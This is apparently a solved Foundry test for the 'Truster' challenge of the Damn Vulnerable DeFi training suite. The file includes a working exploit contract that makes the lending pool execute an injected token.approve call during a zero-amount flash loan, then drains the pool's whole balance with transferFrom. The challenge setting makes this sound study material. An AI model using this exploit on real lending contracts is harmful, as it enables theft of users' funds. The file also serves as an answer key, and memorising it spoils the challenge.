// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {Test, console} from "forge-std/Test.sol";
import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
import {TrusterLenderPool} from "../../src/truster/TrusterLenderPool.sol";

contract TrusterChallenge is Test {
    address deployer = makeAddr("deployer");
    address player = makeAddr("player");
    address recovery = makeAddr("recovery");

    uint256 constant TOKENS_IN_POOL = 1_000_000e18;

    DamnValuableToken public token;
    TrusterLenderPool public pool;

    modifier checkSolvedByPlayer() {
        vm.startPrank(player, player);
        _;
        vm.stopPrank();
        _isSolved();
    }

    /**
     * SETS UP CHALLENGE - DO NOT TOUCH
     */
    function setUp() public {
        startHoax(deployer);
        // Deploy token
        token = new DamnValuableToken();

        // Deploy pool and fund it
        pool = new TrusterLenderPool(token);
        token.transfer(address(pool), TOKENS_IN_POOL);

        vm.stopPrank();
    }

    /**
     * VALIDATES INITIAL CONDITIONS - DO NOT TOUCH
     */
    function test_assertInitialState() public view {
        assertEq(address(pool.token()), address(token));
        assertEq(token.balanceOf(address(pool)), TOKENS_IN_POOL);
        assertEq(token.balanceOf(player), 0);
    }

    /**
     * CODE YOUR SOLUTION HERE
     */
    function test_truster() public checkSolvedByPlayer {
        // Deploy a small helper contract that performs the exploit in its constructor which allows everything to happen within a single transaction.
        Rescue rescue = new Rescue(token, pool, recovery);
    }

    /**
     * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
     */
    function _isSolved() private view {
        // Player must have executed a single transaction
        assertEq(vm.getNonce(player), 1, "Player executed more than one tx");

        // All rescued funds sent to recovery account
        assertEq(token.balanceOf(address(pool)), 0, "Pool still has tokens");
        assertEq(
            token.balanceOf(recovery),
            TOKENS_IN_POOL,
            "Not enough tokens in recovery account"
        );
    }
}

contract Rescue {
    DamnValuableToken private s_token;
    TrusterLenderPool private s_pool;
    address private s_recovery;

    constructor(
        DamnValuableToken _token,
        TrusterLenderPool _pool,
        address _recovery
    ) {
        s_token = _token;
        s_pool = _pool;
        s_recovery = _recovery;

        // Perform the rescue immediately on deployment so the test only needs one tx.
        _rescue();
    }

    function _rescue() private {
        // Read the entire token balance held by the pool so we know how much to rescue.
        uint256 poolBalance = s_token.balanceOf(address(s_pool));

        // Build calldata for token.approve(address(this), poolBalance).
        // We will cause the pool to execute this call on the token contract.
        // After execute, this contract will be approved to move tokens on behalf of the pool.
        bytes memory data = abi.encodeCall(
            s_token.approve,
            (address(this), poolBalance)
        );

        // Call flashLoan with amount=0 (we don't need borrowed tokens).
        // The vulnerable pool will call `token.call(data)` (or similar) using the provided data,
        // resulting in the pool approving this contract to spend its tokens.
        s_pool.flashLoan(0, address(this), address(s_token), data);

        // Now that the pool has approved this contract, transfer the entire balance
        // from the pool to the recovery address in one call.
        s_token.transferFrom(address(s_pool), s_recovery, poolBalance);
    }
}
